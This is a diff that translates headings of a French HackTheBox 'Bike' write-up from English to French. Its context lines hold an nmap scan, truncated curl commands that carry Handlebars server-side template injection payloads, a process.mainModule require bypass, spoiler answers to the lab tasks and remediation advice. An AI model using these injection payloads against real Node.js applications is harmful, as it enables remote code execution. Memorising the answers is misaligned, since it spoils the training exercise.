@@ -1,28 +1,28 @@
-# Bike - HackTheBox Writeup
+# Bike - Write-up HackTheBox
 
 ![HTB Bike](https://img.shields.io/badge/HackTheBox-Bike-green)
 ![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen)
 ![OS](https://img.shields.io/badge/OS-Linux-blue)
 
-## Box Info
+## Informations
 
-| Property | Value |
-|----------|-------|
-| Name | Bike |
+| Propriété | Valeur |
+|-----------|--------|
+| Nom | Bike |
 | OS | Linux (Ubuntu) |
-| Difficulty | Very Easy |
-| Category | Starting Point |
+| Difficulté | Très facile |
+| Catégorie | Starting Point |
 | IP | 10.129.97.64 |
 
 ## Flag
 
-| Flag | Location |
-|------|----------|
+| Flag | Emplacement |
+|------|-------------|
 | Root | `/root/flag.txt` |
 
 ---
 
-## Summary
+## Résumé
 
 1. **Recon** : 2 ports ouverts (SSH 22, HTTP 80)
 2. **Identification** : Node.js + Express + Handlebars template engine
@@ -33,7 +33,7 @@
 
 ## Reconnaissance
 
-### Nmap Scan
+### Nmap scan
 
 ```bash
 nmap -Pn -sV -p 22,80 10.129.97.64
@@ -54,9 +54,9 @@ PORT   STATE SERVICE VERSION
 
 ---
 
-## Enumeration
+## Énumération
 
-### Web Application
+### Application web
 
 La page d'accueil affiche un formulaire pour s'inscrire à une newsletter :
 
@@ -84,7 +84,7 @@ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 
 ```
 
 **Découvertes** :
-- Template engine : **Handlebars**
+- Moteur de template : **Handlebars**
 - Vulnérabilité : **SSTI** (Server-Side Template Injection)
 
 ---
@@ -101,7 +101,7 @@ curl -s -X POST 10.129.97.64 --data-urlencode 'email={{#with "s" as |string|}}{{
 
 **Erreur** : `ReferenceError: require is not defined`
 
-### Bypass avec process.mainModule
+### Contournement avec process.mainModule
 
 Dans Node.js, `require` n'est pas disponible dans le scope global, mais on peut y accéder via `process.mainModule.require` :
 
@@ -126,13 +126,13 @@ curl -s -X POST 10.129.97.64 --data-urlencode 'email={{#with "s" as |string|}}{{
 
 ---
 
-## Task Answers
+## Réponses aux questions
 
 <details>
-<summary>Spoiler - Click to reveal answers</summary>
+<summary>Spoiler - Cliquer pour révéler les réponses</summary>
 
-| Task | Question | Answer |
-|------|----------|--------|
+| Tâche | Question | Réponse |
+|-------|----------|---------|
 | 1 | What TCP ports does nmap identify as open? | `22,80` |
 | 2 | What software is running the service listening on the http/web port? | `Node.js` |
 | 3 | What is the name of the Web Framework according to Wappalyzer? | `Express` |
@@ -182,13 +182,13 @@ curl -s -X POST 10.129.97.64 --data-urlencode 'email={{#with "s" as |string|}}{{
 
 ---
 
-## Lessons Learned
+## À retenir
 
-| Vulnerability | Description | Remediation |
+| Vulnérabilité | Description | Remédiation |
 |---------------|-------------|-------------|
-| **SSTI** | User input directement passé au template engine | Sanitizer les inputs, ne jamais passer d'input utilisateur directement à `compile()` |
-| **Handlebars misconfiguration** | Template compilé côté serveur avec input utilisateur | Utiliser des templates statiques |
-| **Root web server** | Le serveur Node.js tourne en root | Utiliser un utilisateur non-privilégié |
+| **SSTI** | Input utilisateur passé directement au moteur de template | Assainir les inputs, ne jamais passer d'input utilisateur directement à `compile()` |
+| **Mauvaise configuration Handlebars** | Template compilé côté serveur avec input utilisateur | Utiliser des templates statiques |
+| **Serveur web en root** | Le serveur Node.js tourne en root | Utiliser un utilisateur non-privilégié |
 
 ---
 
